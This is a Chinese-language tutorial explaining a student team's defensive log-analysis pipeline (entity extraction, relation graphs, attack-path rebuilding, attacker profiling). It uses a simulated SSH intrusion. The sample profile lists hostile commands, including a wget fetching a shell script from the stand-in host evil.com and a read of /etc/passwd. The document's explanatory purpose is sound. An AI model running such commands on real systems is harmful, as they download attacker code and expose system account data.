# 组员4任务详解 - 从数据流向角度理解

## 📊 完整数据流示例

让我们用一个真实的攻击场景来理解整个数据流：

### 攻击场景：黑客入侵服务器

```
时间线：
10:00:00 - 黑客(IP: 1.2.3.4) 通过SSH暴力破解登录服务器(192.168.1.10)
10:00:05 - 黑客执行命令 bash，查看 /etc/passwd 文件
10:00:10 - 黑客创建后门文件 /tmp/backdoor.sh
10:00:15 - 黑客横向移动到内网主机(192.168.1.20)
10:00:20 - 黑客读取敏感文件 /home/user/secret.txt
```

---

## 🔄 数据流向图

```
原始事件数据 (Elasticsearch)
    ↓
【步骤1】实体抽取 (entity_extractor.py)
    ↓
实体列表 (IP、进程、文件、用户)
    ↓
【步骤2】关系图构建 (graph_builder.py)
    ↓
实体关系图 (节点+边)
    ↓
【步骤3】攻击路径重建 (path_rebuilder.py)
    ↓
攻击路径 (攻击的完整时间线)
    ↓
【步骤4】攻击者画像 (attacker_profiler.py)
    ↓
攻击者画像 (攻击者的特征总结)
```

---

## 📝 详细步骤解析

### 步骤1：实体抽取 (entity_extractor.py)

**作用：** 从原始事件中"提取"出关键信息（IP、进程、文件、用户）

**输入：** 原始事件（从Elasticsearch来的日志）

**输出：** 实体列表

#### 例子：

**输入事件1：**
```json
{
  "@timestamp": "2024-01-01T10:00:00Z",
  "source": {"ip": "1.2.3.4", "port": 12345},
  "destination": {"ip": "192.168.1.10", "port": 22},
  "event": {"category": "authentication", "outcome": "success"},
  "user": {"name": "root"},
  "host": {"name": "web-server-01"}
}
```

**实体抽取器处理后，输出：**
```python
[
  {"id": "ip:1.2.3.4", "type": "ip", "value": "1.2.3.4", "role": "source"},
  {"id": "ip:192.168.1.10", "type": "ip", "value": "192.168.1.10", "role": "destination"},
  {"id": "user:root", "type": "user", "value": "root"},
  {"id": "host:web-server-01", "type": "host", "value": "web-server-01"}
]
```

**输入事件2：**
```json
{
  "@timestamp": "2024-01-01T10:00:05Z",
  "source": {"ip": "1.2.3.4"},
  "process": {
    "pid": 1234,
    "name": "bash",
    "executable": "/bin/bash",
    "command_line": "cat /etc/passwd",
    "parent": {"pid": 1000, "name": "sshd"}
  },
  "file": {"path": "/etc/passwd"},
  "user": {"name": "root"},
  "host": {"name": "web-server-01"}
}
```

**实体抽取器处理后，输出：**
```python
[
  {"id": "ip:1.2.3.4", "type": "ip", "value": "1.2.3.4", "role": "source"},
  {"id": "process:bash:1234", "type": "process", "value": "bash", "pid": 1234},
  {"id": "process:sshd:1000", "type": "process", "value": "sshd", "pid": 1000, "role": "parent"},
  {"id": "file:/etc/passwd", "type": "file", "value": "/etc/passwd"},
  {"id": "user:root", "type": "user", "value": "root"},
  {"id": "host:web-server-01", "type": "host", "value": "web-server-01"}
]
```

**通俗理解：**
- 就像从一篇文章中提取"人名、地名、时间"一样
- 从日志中提取"谁(IP/用户)、做了什么(进程)、操作了什么(文件)"

---

### 步骤2：关系图构建 (graph_builder.py)

**作用：** 把实体之间的关系画成"图"（就像社交网络图一样）

**输入：** 实体列表（从步骤1来）

**输出：** 关系图（节点+边）

#### 例子：

**输入：** 所有事件的实体列表

**关系图构建器处理后，输出：**
```python
{
  "nodes": [
    # 节点 = 实体
    {"id": "ip:1.2.3.4", "type": "ip", "label": "1.2.3.4"},
    {"id": "ip:192.168.1.10", "type": "ip", "label": "192.168.1.10"},
    {"id": "process:bash:1234", "type": "process", "label": "bash"},
    {"id": "process:sshd:1000", "type": "process", "label": "sshd"},
    {"id": "file:/etc/passwd", "type": "file", "label": "/etc/passwd"},
    {"id": "file:/tmp/backdoor.sh", "type": "file", "label": "/tmp/backdoor.sh"},
    {"id": "user:root", "type": "user", "label": "root"},
    {"id": "host:web-server-01", "type": "host", "label": "web-server-01"}
  ],
  "edges": [
    # 边 = 关系
    {"source": "ip:1.2.3.4", "target": "process:sshd:1000", "relation": "connected_to", "timestamp": "2024-01-01T10:00:00Z"},
    {"source": "process:sshd:1000", "target": "process:bash:1234", "relation": "spawned", "timestamp": "2024-01-01T10:00:05Z"},
    {"source": "process:bash:1234", "target": "file:/etc/passwd", "relation": "read", "timestamp": "2024-01-01T10:00:05Z"},
    {"source": "process:bash:1234", "target": "file:/tmp/backdoor.sh", "relation": "created", "timestamp": "2024-01-01T10:00:10Z"},
    {"source": "user:root", "target": "process:bash:1234", "relation": "executed", "timestamp": "2024-01-01T10:00:05Z"}
  ]
}
```

**可视化效果（就像这样）：**
```
        [1.2.3.4] (攻击者IP)
            |
            | connected_to
            ↓
        [sshd] (SSH进程)
            |
            | spawned
            ↓
        [bash] (命令进程)
         /    \
        /      \
   read      created
      /          \
     ↓            ↓
[/etc/passwd]  [/tmp/backdoor.sh]
```

**通俗理解：**
- 就像画一个"人物关系图"
- 节点 = 人/物（IP、进程、文件）
- 边 = 关系（谁连接了谁、谁创建了什么、谁访问了什么）

---

### 步骤3：攻击路径重建 (path_rebuilder.py)

**作用：** 把攻击的完整过程按时间顺序整理出来，就像"犯罪现场重建"

**输入：** 关系图 + 时间线关联的事件（从组员3来）

**输出：** 攻击路径（攻击的各个阶段）

#### 例子：

**输入：** 时间线关联后的事件（已经知道哪些事件是攻击相关的）

**攻击路径重建器处理后，输出：**
```python
{
  "attack_id": "attack-2024-01-01-001",
  "stages": [
    {
      "stage": "initial_access",
      "timestamp": "2024-01-01T10:00:00Z",
      "description": "攻击者通过SSH暴力破解获得初始访问（检测到5个相关事件）",
      "events": [
        # SSH登录失败事件 × 4
        # SSH登录成功事件 × 1
      ]
    },
    {
      "stage": "execution",
      "timestamp": "2024-01-01T10:00:05Z",
      "description": "攻击者执行恶意代码（检测到3个相关事件）",
      "events": [
        # bash进程启动
        # 命令执行
      ]
    },
    {
      "stage": "persistence",
      "timestamp": "2024-01-01T10:00:10Z",
      "description": "攻击者建立持久化机制（检测到1个相关事件）",
      "events": [
        # 创建后门文件
      ]
    },
    {
      "stage": "lateral_movement",
      "timestamp": "2024-01-01T10:00:15Z",
      "description": "攻击者在内网横向移动（检测到2个相关事件）",
      "events": [
        # SSH连接到内网主机
      ]
    },
    {
      "stage": "exfiltration",
      "timestamp": "2024-01-01T10:00:20Z",
      "description": "攻击者窃取数据（检测到1个相关事件）",
      "events": [
        # 读取敏感文件
      ]
    }
  ],
  "total_events": 12,
  "duration": "20s"
}
```

**通俗理解：**
- 就像警察重建犯罪过程
- 把攻击的每个阶段按时间顺序整理出来
- 告诉你：攻击者先做了什么，后做了什么

---

### 步骤4：攻击者画像 (attacker_profiler.py)

**作用：** 总结攻击者的特征，就像给攻击者"画像"

**输入：** 攻击路径（从步骤3来）

**输出：** 攻击者画像（攻击者的特征总结）

#### 例子：

**输入：** 攻击路径（从步骤3来）

**攻击者画像生成器处理后，输出：**
```python
{
  "attacker_profile": {
    "source_ips": ["1.2.3.4"],
    "techniques_used": [
      "Brute Force",
      "Command and Scripting Interpreter",
      "Scheduled Task/Job",
      "Remote Services",
      "Data from Local System"
    ],
    "tools_identified": ["hydra", "bash"],
    "targets": [
      {"ip": "192.168.1.10", "hostname": "web-server-01"},
      {"ip": "192.168.1.20", "hostname": "internal-host"}
    ],
    "attack_duration": "20s",
    "attack_stages": 5,
    "suspicious_files": ["/tmp/backdoor.sh"],
    "suspicious_commands": ["cat /etc/passwd", "wget http://evil.com/shell.sh"],
    "geolocation": {
      "country": "Unknown",
      "city": "Unknown"
    },
    "risk_score": 9.5  # 风险评分 1-10
  }
}
```

**通俗理解：**
- 就像给嫌疑人画像
- 总结：攻击者用了什么工具、攻击了哪些目标、用了什么技术
- 帮助安全人员快速了解攻击者的特征

---

## 🎯 四个模块的协作关系

```
原始事件 (1000条日志)
    ↓
【实体抽取】→ 提取出 500个实体
    ↓
【关系图构建】→ 构建出 1个关系图（500个节点，800条边）
    ↓
【攻击路径重建】→ 重建出 3条攻击路径
    ↓
【攻击者画像】→ 生成 3个攻击者画像
```

---

## 💡 用生活例子理解

### 实体抽取 = 提取关键信息
**就像：** 从一篇新闻中提取"谁、什么时候、在哪里、做了什么"
- 新闻："张三在2024年1月1日在北京偷了李四的钱包"
- 提取：张三(人)、2024-01-01(时间)、北京(地点)、李四(人)、钱包(物)

### 关系图构建 = 画关系图
**就像：** 画一个"人物关系图"
- 张三 → 认识 → 李四
- 张三 → 偷了 → 钱包
- 钱包 → 属于 → 李四

### 攻击路径重建 = 重建犯罪过程
**就像：** 警察重建犯罪过程
- 10:00 - 张三进入商场
- 10:05 - 张三接近李四
- 10:10 - 张三偷了钱包
- 10:15 - 张三离开商场

### 攻击者画像 = 给嫌疑人画像
**就像：** 警察给嫌疑人画像
- 特征：男性，30岁，惯犯，擅长扒窃
- 工具：使用镊子
- 目标：商场里的游客

---

## 🔧 代码实现的核心逻辑

### 1. 实体抽取 (entity_extractor.py)
```python
# 核心逻辑：从事件字典中提取字段
def extract(event):
    entities = []
    
    # 如果有IP，就提取IP
    if event.get("source", {}).get("ip"):
        entities.append({
            "id": f"ip:{event['source']['ip']}",
            "type": "ip",
            "value": event["source"]["ip"]
        })
    
    # 如果有进程，就提取进程
    if event.get("process", {}).get("name"):
        entities.append({
            "id": f"process:{event['process']['name']}",
            "type": "process",
            "value": event["process"]["name"]
        })
    
    # ... 类似地提取文件、用户等
    
    return entities
```

### 2. 关系图构建 (graph_builder.py)
```python
# 核心逻辑：根据事件类型推断实体间的关系
def build(events):
    nodes = {}  # 存储所有节点
    edges = []  # 存储所有边
    
    for event in events:
        entities = extractor.extract(event)
        
        # 添加节点
        for entity in entities:
            nodes[entity["id"]] = entity
        
        # 添加边（根据事件类型）
        if event["event"]["category"] == "process":
            # 进程启动了，就添加"spawned"关系
            if "parent" in event["process"]:
                edges.append({
                    "source": f"process:{event['process']['parent']['name']}",
                    "target": f"process:{event['process']['name']}",
                    "relation": "spawned"
                })
        
        if event["event"]["category"] == "file":
            # 文件被访问了，就添加"accessed"关系
            edges.append({
                "source": f"process:{event['process']['name']}",
                "target": f"file:{event['file']['path']}",
                "relation": "accessed"
            })
    
    return {"nodes": list(nodes.values()), "edges": edges}
```

### 3. 攻击路径重建 (path_rebuilder.py)
```python
# 核心逻辑：按ATT&CK阶段分组事件
def rebuild(correlated_events):
    stages = {}
    
    for group in correlated_events:
        for event in group["events"]:
            # 获取ATT&CK阶段（从组员3的映射结果来）
            tactic_id = event["threat"]["tactic"]["id"]
            stage = TACTIC_TO_STAGE[tactic_id]  # 例如：TA0001 → "initial_access"
            
            if stage not in stages:
                stages[stage] = {
                    "stage": stage,
                    "events": [],
                    "first_seen": event["@timestamp"]
                }
            
            stages[stage]["events"].append(event)
    
    # 按攻击阶段顺序排序
    return {
        "stages": [stages[s] for s in ATTACK_STAGES if s in stages]
    }
```

### 4. 攻击者画像 (attacker_profiler.py)
```python
# 核心逻辑：统计攻击者的特征
def build_profile(attack_path):
    profile = {
        "source_ips": set(),
        "techniques_used": set(),
        "tools_identified": set()
    }
    
    for stage in attack_path["stages"]:
        for event in stage["events"]:
            # 收集源IP
            if event.get("source", {}).get("ip"):
                profile["source_ips"].add(event["source"]["ip"])
            
            # 收集使用的技术
            if event.get("threat", {}).get("technique"):
                profile["techniques_used"].add(
                    event["threat"]["technique"]["name"]
                )
            
            # 识别工具
            process_name = event.get("process", {}).get("name", "")
            if process_name in KNOWN_TOOLS:
                profile["tools_identified"].add(process_name)
    
    return {
        "source_ips": list(profile["source_ips"]),
        "techniques_used": list(profile["techniques_used"]),
        "tools_identified": list(profile["tools_identified"])
    }
```

---

## ✅ 总结

| 模块 | 输入 | 输出 | 作用 |
|------|------|------|------|
| **实体抽取** | 原始事件 | 实体列表 | 提取关键信息（IP、进程、文件、用户） |
| **关系图构建** | 实体列表 | 关系图 | 画出实体之间的关系 |
| **攻击路径重建** | 关系图+时间线 | 攻击路径 | 重建攻击的完整过程 |
| **攻击者画像** | 攻击路径 | 攻击者画像 | 总结攻击者的特征 |

**数据流向：**
```
原始事件 → 实体抽取 → 关系图构建 → 攻击路径重建 → 攻击者画像
```

**通俗理解：**
1. **实体抽取** = 从日志中提取关键信息
2. **关系图构建** = 画出"谁和谁有关系"
3. **攻击路径重建** = 重建"攻击是怎么一步步进行的"
4. **攻击者画像** = 总结"攻击者是什么样的人"
